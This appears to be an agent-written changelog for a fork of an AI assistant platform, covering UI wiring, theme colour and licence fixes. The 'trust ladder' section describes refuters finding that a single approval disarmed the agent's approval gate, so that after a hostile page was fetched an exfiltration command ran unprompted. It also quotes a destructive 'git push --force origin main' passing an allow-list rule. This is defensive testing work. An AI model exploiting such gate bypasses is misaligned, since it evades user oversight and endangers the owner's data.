  skills' … means OPEN THE PANEL — call `ui_control`, NOT a manage/list tool"*, so the one
  phrasing a person would use was routed off a working tool onto a silent no-op. **Fixed.**
- **`tail_serve_output` was advertised on four surfaces and callable from none.** In the native
  schema, in the system prompt, in the RAG tool index, in the cookbook toolset group — and absent
  from `TOOL_TAGS`, which gates *both* call channels. `do_serve_model` **orders** the model to
  call it after every serve: *"Do not tell the user to check logs; you have the log tool."* So at
  the exact moment a model server crashes, the agent reached for the traceback and the call was
  dropped. **Fixed — one string, and the comment eight lines above it already described this
  failure for the rest of the family.**
- **`edit_image` advertises four actions and all four POST to routes that do not exist.** Filed as
  `H03` rather than fixed: all four capabilities are real under other names, but the bodies
  differ enough that a path map would be wrong.

**Then losing their data.** `agent_email_confirm` defaults on, so agent-composed mail is staged
into `scheduled_emails` with a `send_at` the poller never reaches. Three routes exist to approve
it. **`grep` for them across 183 frontend files returns nothing.** The model is instructed to tell
the user their mail awaits approval *in the chat UI*; there is no approval surface in existence.

**Then hiding capability the owner already paid for.** A 475-line Personal Assistant with daily
check-ins whose only entry point is gated on a function that occurs **once in the repository, at
that call site**. A complete embedding-model manager: seven admin routes, zero pixels. Session
cleanup *with a dry run*. Three memory views including "why did it remember that". A blind-vote
history you can never read. An add-to-album endpoint that takes exactly the array the gallery's
existing multi-select already produces.

**And two places where a control lies.** Seven of eight feature flags do nothing, and four are
un-hidden one line after being hidden — measured by replaying the real sequence: 9 of 9 hidden,
then 7 of 9 shown again. `PANTHEON_TASK_CONCURRENCY_CAP` has **never worked on any install**, not
"after the first admin save" as `B20` says — `get_setting` merges defaults on every read, so the
env layer is unreachable code, and the helper written to solve exactly this has zero callers.

**Two lessons about our own instruments.** `check-wiring.py` matches only lookups whose argument
is a *string literal*, so the id map that produced the headline defect scored clean — Law 13's
enforcement has a structural blind spot, not a one-off. And it does not strip comments: writing
the correction note with the call spelled out made it count my own comment as an unresolved
lookup. Both are now on `P3-15`, whose specification is no longer "a script finds the next three
for free" but "a correct script rediscovers all 21".

**Also corrected: three documents told contributors to target a `dev` branch that does not
exist** — at clone, at contribute, and at harden-CI, the three places a newcomer meets the
project. `README.md` said the opposite and was right. And the README's own badge said 5,742 tests
while its body said 6,277, on one page.

### `P1` wave 2 — four rows, and the feature the owner loves was quietly broken
`P1-02`, `P1-03`, `P1-04`, `P1-05`, plus `B24`. `a67000b..HEAD`. **296 tracked, 77 done. Suite
6,199 → 6,277, the same 19 failing and all 19 pre-existing.**

**The find of the run did not come from a row.** The owner sent a real exported theme mid-run
with a note: *"the theme creator that's built into the platform… is genuinely awesome, and we
should ensure it stays functional. It is also the location where you enable the glass panels
too."* Checking it against the code took ten minutes and found that **a theme stores seven
options and the exporter wrote four**. `frosted` was one of the three missing — so turning the
glass on, exporting, and importing on another machine silently gave you a theme with the glass
off, and a tuned background pattern came back at its defaults. The importer had the identical
gap. **Nothing failed loudly**: the file imported cleanly and simply produced a different theme,
which is exactly why it had survived every previous pass over that module. Four lists now carry
all seven and a test holds them equal, **using the owner's own export as its fixture**. The
editor is named in `FORBIDDEN.md` Part 1 with his words attached.

**`P1-03` was the row whose value was the work.** Its counts were right — 93 bare uses, zero
declarations — but "renders at full strength" undersold it: **nine of the 93 rendered nothing.**
`.ge-adj-hist-handle` is a triangle drawn entirely from borders and painted none; every
image-editor history dot but the current one was invisible; and three tab strips hovered
`--fg-muted → var(--fg)`, so on `retrowave` and `terminal` — where those two are the same hex —
inactive, hovered and active tabs were one colour.

**And the obvious value would have reintroduced `P1-01`'s defect one layer down.** Every point on
the `--fg`→`--bg` segment passes within 22.0 sRGB units of `forest`'s accent *at every ratio*,
and the sheet paints "inactive" muted against "active" accent at **33 opposition pairs** — so the
natural choice collapses all 33 on `forest`, and on `gpt` too. That is `P1-01`'s third class
relocated from the fallbacks into the value. Pivoting through `--color-muted` moves the closest
approach to 45.6 and the collapsing pairs to zero.

**`P1-02` ended in deletion, and the arithmetic is why.** Three of its four keys have **zero
readers in the entire tree**; the fourth resolves to the theme's red at 124 of 130 sites. Wiring
it would have *defined* the token on every load and retired the fallback at all 131 — six of them
changing colour on all sixteen themes. That is the flattening `D-2026-08-26-03` protects against,
spelled with a different token name, and `P1-01` refused exactly this for `--accent` eight days
earlier.

**`P1-04` is the row where "delete" was the wrong verb.** The backdrop's every style lives inside
a `max-width:768px` query, so deleting the top-level `display:none !important` leaves a bare
`<div>` — and `body { display: flex }`, so a zero-width flex child. Scoped to `min-width: 769px`
instead. Why it existed at all: it sits directly below a blanket rule written for **dead markup**
and arrived in the same commit — a live element caught by someone else's cleanup.

**`P1-05` closed a control that was fighting itself.** The rail gear unhid the sidebar and
scrolled it, and `syncRailSide()` sets the icon rail to `display:none` when the sidebar is open —
so it hid the very rail containing the gear just clicked. `sidebar-layout.js` had *already*
excluded that button from its scroll-to-section handler; the `app.js` handler was doing precisely
what its sibling deliberately excluded it from.

**One of my own edits called a function that does not exist.** `applyFrosted`, where the real name
is `applyFrostedGlass`. `node --check` passed it — it parses, and does not resolve names. Caught
by looking, then pinned by a test that checks every function the importer calls is one the module
defines. It is the same `Law 13` shape this programme keeps finding in other people's work, and it
took about ninety seconds to introduce.

### `P1-01` — the row whose numbers were the work, and the badge that would have turned red
`P1-01` (define `--accent` per theme). `7f28702..HEAD`. **296 tracked, 73 done. Suite 6,156 →
6,199, the same 19 failing and all 19 pre-existing.**

**The count moved a fourth time, exactly as the row warned it would.** 508 → 521 → 535 → **816
sites at implementation, 553 of them `var(--accent, var(--red))`**. `static/style.css` is 42,739
lines now. Both figures are re-derived by a test in both directions, so a stale comment fails
rather than drifts — which is the only durable answer to a number three documents have already
carried wrongly.

**But the counts were not the finding. The row's model of the population was wrong.** It described
two classes: fallback sites that do not move, and bare sites that gain colour. There are three.
562 resolve to the theme's red and do not move; 204 paint for the first time; and **63 carry a
hand-picked fallback that is not red, so defining the token changes their colour.** No version of
`P1-01`, `DECISIONS.md` or `FORBIDDEN.md` had named that third class, and the row's `Verify:` line
— *"only the previously-unstyled elements change"* — would have failed on the tree it produced.

**Twelve of the 63 were never accent sites.** A green *verified* badge, two link blues, a
supervisor amber and a green completion dot had all reached for `var(--accent, <the real colour>)`
because `--accent` did not exist and the fallback was the actual intent. Left alone,
**`.skill-verified` would have rendered in the same hue as `.skill-needsmark`** on all sixteen
themes — a verified badge in the failure colour — and `.note-checkbox-edit:hover` would have
matched the *delete* control beside it at identical geometry and identical tint. They now name the
semantic token they meant, all four of which already existed, because adding a third colour
vocabulary is precisely what `P1-06` is blocked for.

**The classification criterion is the part worth reusing.** Not *"red is wrong here"*, which is a
taste argument and theme-relative anyway — `--red` is the palette's brand accent and `terminal`
sets it to green. The test was: **after the change, does this element become indistinguishable
from a sibling that means the opposite?** That is checkable, theme-independent, and it is what
separated the twelve from the fifty that stay accent-coloured.

**Two dead sites, not one.** `P1-02` says exactly one `--accent-primary` use is genuinely dead and
that `P1-01` fixes it. The session rename input is fixed as predicted. The second — *"+ New
Folder"* at `sessions.js:426` — had **no fallback at all**, so it resolved to `inherit` and the
action row rendered identically to the plain folder rows above it. `P1-01` could not reach it:
there is no `--accent` in that chain to define. Fixed in passing.

**And `P1-02`'s real content turned out not to be hygiene.** `create_theme` accepts
`accentPrimary` and `index.html`'s first-paint script writes it, but `ADV_KEYS` omits it — so
`applyColors()` never updates or clears it, and a theme made through the assistant sets
`--accent-primary` once and it sticks, stale, through every later theme switch. `style.css`'s own
header claimed theme.js set it. Both corrected; the row now says what it is for.

### The trust ladder — and the run where refutation found the control inverted
`P7-03` (rung "ask every time") and `P7-04` (rung "allow-listed"), discharging `P7-05`'s
superseded acceptance criterion. `3b5cf9c..HEAD`. **296 tracked, 72 done. Suite 5,962 → 6,156,
the same 19 failing and all 19 pre-existing.**

**Three implementers, two refuters, both `broken: true`, and the headline finding is the reason
this programme refutes everything.** The ladder *inverted*. `approval_gate_bypassed` short-circuits
the gate before the rung is consulted, and both approval buttons set `allow_remaining_actions` — so
on `ask_every_time`, approving one harmless `bash` in a clean run disarmed the gate, and a later
round fetched a hostile page and ran an exfiltration command **with no prompt at all**, an action
the *default* rung stops and asks about. The two "stricter" rungs were strictly less protected than
the one they sit below, and the ladder's own copy promised the opposite in the same commit. A
second refuter found the same shape in the allow-list: a standing *"anything starting with git"*
rule let `git push --force origin main` run unprompted in a run that had already pulled in a web
page. Both are one line each, and neither was pinned by any test — which is how they survived
three implementers who all reported their work green.

**The reason both happened is the same and worth keeping.** Before this row a card could only exist
once untrusted content had armed the gate, so every grant was given under the same threat model it
then relaxed. A rung mints cards in *clean* runs, and **a yes given when nothing was wrong must not
spend itself after something is.** `src/tool_execution.py` already enforced that across the
approval door; nothing enforced it across the bypass door, or across a saved rule.

**The row also could not be answered end to end when it first landed, and the batch said so instead
of ticking.** `execute_tool_block` refused every approval replay unless *both* the run and the
sealed pending carried taint — because "taint seen" had been standing in for "the gate asked". A
rung refusal mints a card with taint false, so approving it answered *"Exact-action approval
requires an armed run security context"* and the tool never ran: the ladder could ask a question
nobody could answer. It shipped as `xfail(strict=True)` naming the file and the fix rather than as
a green tick, which is the behaviour the laws are for.

**Two more `breaks-users` findings, both a control reporting success and doing nothing.** In
no-login mode the route filed rules under the reserved local owner while the run carried
`owner=None`, so every rule was written, listed, toasted as *saved*, and never read. And switching
*onto* the allow-listed rung never drew the "always allow" chooser until a page reload — the one
thing the rung promises, unreachable by the route a first-time user takes.

**The largest gap was not code.** A rule could be created and then neither seen nor revoked from
any screen: the widest grant, *"anything bash does"*, one click away with no undo. `core/database.py`
had already written *"this is the table where that omission is expensive"*, and the store's
five-second TTL was defended on the grounds that *"revoke means revoked before the user has
finished reading the confirmation"* — with nothing in the product able to revoke. There is a list
under the ladder now, and its failure path says the unwelcome half out loud.

**On mutation testing.** Between them the two waves ran 58 mutation/test pairs and found eight
properties the code got right that no test pinned — including the second half of the replay guard,
whose deletion passed the entire suite, and the revoke route's authentication gate. Two mutants
survived a batch's *own* first sweep and exposed real gaps in tests written minutes earlier. And
one finding came out of it that belongs to nobody here: a 1,984-character nested tool argument
kills a run at every rung, because `json.loads` is wrapped in `except (TypeError, ValueError)` and
`RecursionError` is neither. That is `B17`, pre-existing, and the model writes that content.

### P6 closes at 18 of 18 — the steer route, and the taxonomy that ranked nothing
`P6-18` (steer mid-response), `P7-06` (rank prompts by effect) and `P6-11` (the plan window's
fifth field, closed by `P7-06`). `22c8628..HEAD`. **296 tracked, 70 done. Suite 5,835 → 5,962,
the same 19 failing and all 19 pre-existing.**

**Two rows, three implementers, three refuters, and all three refuters returned `broken: true`.**
Both headline findings were the same shape: a thing that *looked* landed, passed its tests, and was
wrong in the one case that mattered most.

**`P6-18`'s gate asked the wrong question, and it deleted user text on the default mode.**
`agent_runs.is_active()` answers "a run is registered", not "a run that can read the steer inbox is
in flight" — and `agent_runs.start()` is called for every non-compare stream while only one of
*four* exits reaches `stream_agent_loop`. So on a plain chat turn the route accepted the steer, the
client cleared the composer and said *"lands at the next step"*, and the words went into an inbox
nothing would ever read. Reproduced end to end, server and client. Fixed with `is_steerable()` —
liveness stays in `agent_runs` (`Law 14`), it is just now the right predicate — plus a fourth
non-steerable exit the refutation itself had missed. Three more closed with it, including a
`Law 13` half-wire that had been sitting in plain sight: `steer_applied` was emitted by the
backend, exported by the frontend, documented in both, and **routed nowhere**, so the module's own
"your steer missed the run" warning could never fire.

**`P7-06`'s ranking lied about the worst action in the product.** `bulk_email` — the tool whose
purpose is deleting *many* messages, and which with `permanent: true` bypasses Trash entirely —
ranked **below** `delete_email` for a single message. The card for emptying a mailbox read milder
than the card for deleting one email, which is the exact inversion the row exists to prevent. The
general defect underneath it was worse: the action tables are keyed on bare tool names while the
model can call an email tool under its MCP alias, so *every* aliased call was missing its own
action table and resolving one rung low.

**The second finding made the design smaller, and is the one worth remembering.** Three files
asserted that the sealed approval payload "cannot carry more — the seal is a control that never
lifts", so the presentation was threaded beside it, event by event, consumer by consumer. The
premise was false: the digest seals a server-side dict, while `public_payload()` is a derived view
never read back as authority — proven by mutating it and watching the digest hold. Refutation had
already found **three** surfaces shipping the card unranked because of the threading. Moving the
resolution *inside* the shared payload deleted two copies, fixed all three surfaces at once, and
turned five pending consumer edits into none. **A false constraint had produced real duplication,
and the duplication was already drifting.**

**`Law 15`, from the refuter, unedited: *"the honest answer is yes — from the sentence, not from
the design."*** The wording carries the card; the visual system was one pixel of font-size, two
pixels of rule width and one mark shape — and on six of sixteen themes it was actively harmful,
with the `serious` lead measured at **2.11:1 on `paper`** while the harmless line beside it sat at
11.05:1. The lead is no longer recoloured. After: no theme has the serious lead more than 10%
below the routine line, where 14 of 16 did before.

**On refutation itself.** Twenty-eight mutation/test pairs were run against the new tests; two
mutants survived the first pass and exposed real gaps in tests written by the same agent that
wrote them. Six mutations had survived all sixteen original surface tests, including one that
inverted the module's stated fail-high rule for unknown effects. `tests/test_tool_capabilities_effects.py`
exists because of that mutation and nothing else.

### P6 reuse wave — three rows, and the systemic defect they uncovered
`P6-04` (queue panel), `P6-06` (sequential-vs-parallel picker), `P6-07` (point the Tasks activity
view at queue items) and `P3-11` (one specifier per module). `01e8807..HEAD`.

**The integrator's verdict on the three reuse rows was "tick nothing" — all three failed their own
`Verify:` line — and it was right.** What it found underneath them was not three defects but one:
`P6-07`'s registry did not work, and the reason was that `chat.js` registered through
`import('./tasks.js')` while `app.js` imports `'./js/tasks.js?v=…'`. **ES module identity is keyed on
the resolved URL including the query string**, and there is no import map in this tree, so those are
two modules with two copies of their state — and nothing fails loudly when it happens. A registry
written through one specifier is simply empty when read through the other.

**Eleven modules were forked that way.** `chatRenderer.js` under three URLs, `modalManager.js` under
two, `settings.js`, `tasks.js`, `gallery.js`, `memory.js`, `models.js`, `slashCommands.js`,
`compare/index.js` and both research modules. Two features were dead because of it: `P6-07`'s
registry, and `chatStream.js`'s `research_started` fast-path adopt, which called `adoptSession` on an
instance whose `_jobs` array was always empty — so every agent-started research job waited for the
slow poll instead. **Eight `sw.js` precache entries had never matched a request URL**, because the
fetch handler uses `cache.match(e.request)` with no `ignoreSearch`. And the fork *silently defeated a
control `FORBIDDEN.md` says never lifts*: "the approval cache-buster string must be bumped across all
six approval-path modules together" was structurally impossible to obey while four importers held no
buster at all. Nobody lifted that control. It was voided by an unrelated convenience, four modules
away, and the document went on describing a guarantee the tree could not provide.

`P3-11` had been sitting in the tracker the whole time, scoped as *"one module, one line per import,
a performance row."* It was eleven modules, 42 rewrites across 27 files, and not a performance row.
**`check-specifiers.py` now runs in CI at `--max 0`**, beside the wiring ratchet the alignment pass
wired up — the second entry in a section that exists because `Law 13` needs a machine, not a habit.

**On reuse, the three rows landed differently and the tracker says so.** `P6-07` is the unambiguous
win: 19 hunks in `tasks.js`, exactly one of them new. `P6-04` genuinely reuses the app's `Storage`
helper and the activity view's row CSS rather than building a second store or a second row system.
`P6-06` is a **clone**, not a share, and the row states that plainly — the honest answer was that
sharing it as written would ship *"Opens N new chats"* to a panel that opens no chats, which is a
worse `Law 15` outcome than the duplication. Parameterising it is `P5-17`, filed with the three
differences named.

**Nine defects were found by refutation and fixed before any of these were ticked**, four of them
`breaks-users`: a *Send now* button that was a guaranteed no-op, a per-item mode that flipped the
composer permanently and survived a reload, a model restore that fired before the send it was
restoring, and parallel mode 403ing for every signed-in non-admin. Three more were caught reviewing
my own work in this run — an editor that lost your typing on any re-render, a popover leaking two
document listeners per toggle, and uploading rows inflating the count behind the Send button.

### Vision alignment — the corrections landed on the rows and never got carried up
**Five read-only auditors and a reconciler, against twelve vision points quoted from the owner
verbatim rather than paraphrased.** The verdict is worth stating plainly: this programme is
substantially aligned. `V1` (elevation, not rewrite), `V4` (training parked), `V5` (no
marketplace), `V6` (permanence, not a picture) and `V12` (AGPL, the non-commercial line as a
wish) are honoured well and in the owner's own terms, and `V7` and `V8` are enforced row by row
rather than merely cited.

**What had not happened was the second sweep.** A correction would land on the task row and never
be carried up into the preamble, the header, the decision file or the README above it — so five
vision points were contradicted by a document sitting *upstream* of the row that got them right.
The P0 preamble still stated the pre-correction deployment assumption fourteen lines below a
paragraph superseding it. `P0-29` said the Forge name was "pending" on a row whose own title
carries the decision id. `P11-02b` said 84 `require_admin` sites where its own phase preamble had
retired that number twice, thirty lines above.

**The worst finding was not a vision drift at all. It was the thing that would have caught them.**
`P3-13` — *"wire `check-wiring.py` into CI"* — was ticked done, and `git grep check-wiring`
outside `.pantheon/` returned two hits, neither of them a workflow. Three documents advertised a
gate that did not exist. The law against shipping half-wired features was itself half-wired.
**It runs now**, as the `wiring-ratchet` job, which made all three claims true rather than
requiring three documents be edited down to match a gap.

**The correction with the most at stake was `P3-10`.** It scheduled `tourAutoplay.js` for
deletion as a dead module. It is 133 lines of working code, imported from `index.html`, mapping
seven modals to per-feature walkthroughs — **the product's entire first-run onboarding.** `Law 15`
exists in this project because its owner stopped using a competitor's *more advanced* version of
what we are building, for one reason: *"There's no tutorials and the learning curve is too
steep."* Deleting the only tutorial we have would have been that mistake, made deliberately, by
the project that wrote the law. Split: `calendar/reminders.js` goes, and `P3-10b` turns the tours
back on.

**Two corrections the owner gave had never become decisions at all.** Identity and the RBAC
clean-up — thirteen `P11` rows resting on one subordinate clause inside an entry titled *"what
that voids"*, with `rbac` and `keycloak` both returning zero hits in the decision file. And the
Brain losing its graph, one of the five corrections this tracker itself names, with `Brain`,
`graph` and `confetti` all returning zero. Both are now written down. `D-2026-08-26-07` and
`D-2026-08-26-08`.

**`Law 15` was stated and then never applied.** Cited zero times across 101 open `P0`–`P6` rows;
87 of them carry no `Verify:` line at all; the 48-row Workshop phase — the three steepest surfaces
in the product — had a one-line preamble and no legibility gate, while its own second row already
diagnosed a live `Law 15` failure. Gates added to `P4`, `P5`, `P6`, `P8`, `P9` and `P13`, and
Laws 13–15 moved into the anti-drift section they belong to: they had been filed below *"When to
stop and ask"*, which is exactly why the header's count of thirteen omitted those three.

**And `Law 6` caught us again, in the sentence that ruled it out.** `P1-01` said *"521, not 508 —
`style.css` has one commit in this repo, so the old figure was wrong when written, not stale."*
The file has three commits. Our own P6 wave 2 added 342 lines to it the next day, and the count
is now **535**. The claim that a number could not go stale went stale in twenty-four hours.

Nineteen numbers refreshed with their scopes, twenty-one document contradictions closed, one
finding rejected — see below.

### One audit finding rejected, and the brief was mine
The `V2` brief said the project must not frame models as *"deities, oracles, minds, or anything
with a claim about what they ARE"*, and an auditor correctly applied it to **The Brain**, the name
of an entire phase. That extension was wrong, and it was wrong because I wrote it. The owner
rejected **Olympus** specifically — *"posturing the LLM's as 'Gods' in residence"* — and then, in
a later message, introduced "The Brain" himself while asking about a competitor's. He named it
after the decision, knowing it. The auditor flagged it as a question rather than a defect and
said the owner should decide, which was the right call. The name stays; the over-broad brief is
recorded here so nobody re-derives the objection from it.

### P6 wave 2 — the plan window exists, and four prompt strings stopped lying
**Three rows done, one honestly left open.** `static/js/planWindow.js` renders the approved
checklist docked beside the chat, updates when `plan_update` arrives, and survives a reload.
`src/agent_loop.py:759`, `:3402-3403`, `src/tool_index.py:109` and `src/tool_schemas.py:545`
have all been telling the model *"the user's docked plan window updates live"* since before this
fork existed. **That sentence is now true**, verified by driving the live module against the real
SSE ordering rather than by reading the code.

`P6-11` stays open on one point: `effect`, one of its five named per-step fields, is the 13-value
`ToolEffect` taxonomy and it is **not on the SSE wire** — neither `tool_start` nor `tool_output`
carries it. Four of five ship; the row is not finished, so it is not ticked.

**Refutation found two `breaks-users` defects, and the first is the kind that only turns up when
someone drives the code.**

- **The window was corrupted by the tool it was built for.** `update_plan` is what the model is
  *ordered* to call after every step — and it arrives wrapped in the same `tool_start` /
  `tool_output` pair as real work. So each step's real bound tool was overwritten with
  "update_plan", its result deleted, the raw plan JSON rendered as the target chip, and a phantom
  result planted on the step that had not started yet. The window would have destroyed its own
  contents on the mainline path, every step, from the first run.
- **Approving one plan approved every later plan on that browser.** A new plan reset neither the
  approval nor the per-step history, which it inherited by ordinal — so a brand-new checklist
  read "Executing" and bound the next unrelated tool call straight to its step 1.

`P6-17` came with five more, including **a second live door onto the same defect** — compare mode
builds the identical card and `todowrite` is not stripped from it, so the agent's task list still
surfaced there as raw JSON. That is the third time this programme has found a fix that was right
and reached only one of two paths (`P6-01`, `P6-10`, now this). Also fixed: N repeated calls
stacked N always-visible contradictory lists; a *successful* cleared list fell back to raw JSON;
and the dashed in-progress box never drew, having lost a specificity contest to
`li.task-item .task-check`.

**The cross-batch finding neither refuter could see.** Both batches render the same row
component, and they disagreed on its accessibility contract: the todo card gave each box
`role="img"` and a label, while the plan window — this wave's headline feature — set
`aria-hidden` on every one. A completed step was **silent to a screen reader**, its only "done"
signal a fill and a strikethrough. Each refuter reviewed its own half and the halves had drifted
apart inside a single run. The plan window now adopts the better contract.

**The sixteen themes are intact**, checked five ways: zero `--accent` definitions in `:root`
anywhere, no runtime `setProperty('--accent')`, every added token pre-existing, and zero
hardcoded hex added. One real find in passing — `.plan-step-ok` and `.plan-step-bad` both
resolved to `--red`, so success and failure chips were **the same colour in all sixteen themes**
until `P1-01` lands. Now `--green`, which is a real `:root` token.

**Suite: 5,785 passing, 19 failing, all 19 pre-existing.** The integrator caught that the
baseline had quietly become 22, and the three extra were mine: wave 1's `crew_member_id` tests
passed alone and failed in the suite, because they resolved `SessionLocal` at import time while
the executor resolves it at call time — so any earlier test rebinding it broke them. Made
hermetic against their own database, the way the rest of the suite does it.

### P6 wave 1 — the queue bug cluster closed, and two fixes that needed a second pass
**Ten rows done.** A queued message no longer fires into whichever chat happens to be open, the
queue survives a reload, queueing with an attachment works instead of swallowing the send, and
ten clicks on "solve with an agent" no longer start ten unbounded agent loops. Plan mode can ask
a clarifying question, its verifier judges against the approved checklist instead of the literal
string *"Execute the approved plan."*, and `crew_member_id` reaches the executor.

**Refutation caught two things that would have shipped as green ticks, and both are the same
shape: the fix was right and incomplete.**

- **`P6-01` still leaked on a second path.** The auto-drain was genuinely fixed; the
  click-to-promote path was not. It guarded at *click* time, then handed the item to a poller
  retrying every 220ms with no check — so switching chats during the abort round trip still
  posted one session's text into another. Guarded at *send* time instead, and a mismatched item
  goes **back into the queue** rather than being dropped. Verified with the refuter's own attack
  script: never fires into B, kept and addressed to A, still sends on returning to A.
- **`P6-10` shipped half-wired.** The tool schema advertised `crew_member_id` while the executor
  had never heard of it, so the model would accept the argument, report the task assigned, and
  the value would vanish — the model confidently telling someone their task runs as Research Bot
  when it does not. Now resolved through an owner-scoped lookup, with six tests pinning the
  round trip, the cross-owner refusal, and schema-versus-executor agreement.

**Four premises were wrong, including one this tracker itself wrote.** The run brief warned the
integrator about a `P6-15` seam at `chat.js:961`; there was no seam — `chat.js` has posted
`approved_plan` since before this phase and that line is the trigger, not the payload. `P6-14`'s
mechanism was wrong (the tool was stripped from the prompt, not rejected by the gate — plan mode
was mute, not lying). `P6-08`'s quoted comment was wrong twice over. And an implementer proposed
a wording correction to `P6-03` that refutation showed was itself false; it was not applied.

**Two comments were asserting things the tree contradicted, and both are corrected in place.**
`P6-16`'s exemption was justified with "every mutating tool is denied anyway" — but plan mode is
an *allowlist* with 25 read-only tools enabled and a directive ordering their use, so the nudge
was harmful rather than harmless. And `core/database.py`'s new status block said `error` was the
only status counting against a task's error rate while `static/js/tasks.js` text-scanned run
output for the word "error" and filed aborted runs under Errors — fixed, with the one remaining
violation named in the block and filed as `B07`.

`AGENTS.md`'s Law 13 still said the wiring count was **78**. It has been **2** since the wiring
run — the law against carrying numbers, carrying a number. Both refuters found it independently,
which is how you know it was misleading rather than merely stale.

**Suite: 5,779 passing, 19 failing, all 19 pre-existing and verified unchanged.** One of my own
edits broke three tests on the way — adding the concurrency env var to `docker-compose.yml` alone
tripped `test_gpu_compose_standalone.py`, which pins the standalone GPU files as base-plus-overlay.
That is the suite doing its job, and it is why the setting now lands in all four places it has to
exist rather than the one that was obvious.

### P0 licence run — ten rows closed, and the notices now travel
**Eleven agents: five implementers on disjoint files, five refuters told to break the work, one
integrator that re-ran every check itself.** `P0-14`, `P0-19`, `P0-20`, `P0-21`, `P0-22`,
`P0-23`, `P0-24`, `P0-25`, `P0-26` and `P0-28` are done; `P0-08` and `P0-16` are open on one
named point each. Eighteen licence bodies now sit in `licenses/`, every one fetched from
upstream at the version actually vendored and byte-compared by at least two agents
independently. `ACKNOWLEDGMENTS.md` merged into `CREDITS.md` losslessly and is gone
(`D-2026-08-27-01`).

**Refutation earned its place, and the pattern is worth naming: the implementers' *code* held
and their *claims* did not.** Twelve findings, none trivial. Three were legal:

- **The notices did not travel.** `Pantheon.spec` and `build-windows-portable.ps1` listed their
  payload by hand and shipped no licence file at all; `.dockerignore`'s blanket `*.md` excluded
  `CREDITS.md` — the file `NOTICE` names as this distribution's third-party notice — from the
  image. Adding bodies to `licenses/` had satisfied MIT/BSD/OFL for the git repo and for none of
  the three things people actually download. Pre-existing; now `P0-30`, fixed.
- **Six AGPL files were stamped `# Licence: licenses/DeepResearch-Apache-2.0.txt`** — the only
  per-file licence declarations in the whole Python tree, reading as a claim those files are
  Apache-2.0. Reworded.
- **"Modified for Pantheon" was false on seven of eight stamped files.** Measured against the
  fork point, only `routes/research/research_routes.py` differs. §4(b) still applies, but the
  party who changed them is Odysseus, and the notices now say so.

Two more were the run tripping over itself, which is what concurrent file ownership costs:
`CREDITS.md` described five licence files as missing that another agent added five minutes
later, and the `ACKNOWLEDGMENTS.md` deletion left a 404 in a README section nobody owned.

**`P0-25`'s correction was itself an undercount** — the sentence written to fix "form-filling
only" claimed to have resolved *every* call site and had walked two files. Ten handlers reach
PyMuPDF, and the two missing were `/api/chat` and `/api/chat_stream`.

**`P0-28` was replaced rather than deleted.** `.github/ISSUE_TEMPLATE/feature_request.yml:11`
linked the root `ROADMAP.md` by absolute URL — invisible to any README-scoped sweep — so a bare
delete would have 404'd it. The path now holds a pointer, which the task line always allowed and
which loses nothing that git history does not keep.

**Suite: 5,780 passing, 19 failing, all 19 pre-existing at `ec1c7c0` and unchanged by this run**
(verified by stashing). Two went green: a `P0-04` residue where the fixture proving the storage
rename still seeded `ody-prefetch-settings`, and a security line the README rewrite had reworded
out from under the test that pins it verbatim — `AUTH_ENABLED=true`, restored.

### Roadmap verification — every open task re-read against the source
**Eight agents, 282 rows, zero source files changed.** Five tasks were finished and untracked
(`P0-09`, `P2-22`, `P2-23`, `P8-01`, `P9-15b`), **two ticks did not hold** (`P0-08` — `ODY_USER`
never renamed; `P0-14` — the second upstream identity never named), **28 rows had a false premise**,
and **40 figures were wrong**, including a `508` copied into three documents that is really `521`
and a function called `applyTheme()` that does not exist. Full report in
`.pantheon/VERIFY-2026-08-27.md`; every correction is on its own task line.

The pass paid for itself twice over. `P3-10` would have deleted the RAG module four days after
`P2-23` brought it to life. `P3-03` would have deleted the exact CSS `P2-20` needs. `P3-17`'s
acceptance test **passed on an unfixed tree**, and so did `P1-05`'s. Nine rows were smaller than
written and three were larger — `P5-13`'s icon variance is two and a half times what the line
claimed. Eleven rows are now marked blocked with the blocker named, because a row that cannot
start is worth knowing about before an agent claims it, not after.

**What the checker cannot see.** `check-tracker.py` recounts marks against the table and passes
whatever the source says — it never opens a source file, so it was green throughout while five
finished tasks sat unticked and two false ticks sat green. That is `Law 8`'s blind spot, named
here so the next person does not mistake a green checker for a true tracker. `check-wiring.py`
has its own: it scans neither `static/app.js` nor `static/sw.js` and sees only literal
`getElementById`, so `admin.js`'s 39 dead `el('adm-*')` lookups have never been counted. Both
are written up on `P3-15`.

### Wiring run 01 — 78 unreachable features resolved, 2 left
**340 insertions, 1,524 deletions.** Mostly deletions, as predicted: `models.js` shed 565 lines
whose entry point exists in neither this tree nor upstream, a document overflow menu whose
initialiser had one reference in the whole tree — its own definition — and an Ollama browser with
two independent first-party removal notes. What got wired instead were features whose absence was
a live bug: archived documents could be archived but never retrieved, the RAG upload module that
`AGENTS.md` quotes as Law 13's own incident, and a skill-creation form whose absence meant every
hand-made skill shipped with `description == name`. Three renames fixed real defects, including
`submit`, which left the send button stuck in streaming state after tab recovery.

The two survivors are checker artifacts. `adv-` is a truncation of `getElementById('adv-' + key)`;
`cmp-history-0` **is** built, as `'cmp-history-' + i`, and the regex banks the prefix. Reaching
zero means editing the checker, so 2 is the floor.

### README rewritten dry, with badges and a nav row
The AI-essay rhythm was the real problem rather than the length — "this isn't X, it's Y"
reframes, punchy two-word closers, a rhetorical turn ending nearly every section. Rewritten
against `we-promise/sure` and `apexcharts` as reference: badge row, nav links, quick start first,
bullets over prose, origin told as plain fact. 1,269 words, and a regex scan for the reframe
pattern comes back clean. `P0-13` grew the screenshot requirement.

### README trimmed, and the unwired inventory made public
Prose cut to 1,411 words. Gained a section the old one was missing entirely — the 78 unreachable
features by subsystem, which is the most interesting thing about this fork and was buried in a
tracker nobody outside would read. All three nav anchors verified against real headings, and both
licence obligations re-checked after the trim.

### README rewritten for people
Same facts, told as a story rather than an audit: saw Odysseus, fell in love, read all 41,401
lines of the stylesheet, decided to finish it. The forensics moved out of the prose and the
numbers stayed — 288 tracked, 30 done, and it still says so. `P0-14`'s §5(a) statement and
`P0-27`'s statement of intent were both re-verified present afterwards, because a rewrite that
quietly drops a licence obligation un-ticks a task nobody would notice.

### Wiring run 01 in flight — all 78 under classification
Every unresolved lookup inventoried and batched by owning file: documents 19, gallery editor 17,
Forge 12, skills+RAG 8, email+gallery 8, shell singletons 14. Six agents classifying each id as
rename victim, dead code, or missing markup — with the rule that a deletion needs evidence the
code is unreachable and a build needs evidence no working UI already does it (`Law 1`, `Law 14`).
No agent may edit `index.html`; markup is emitted as fragment specs and applied serially by one
agent afterwards, so the one shared file cannot collide.

### All eighteen decisions answered; the Brain loses its graph
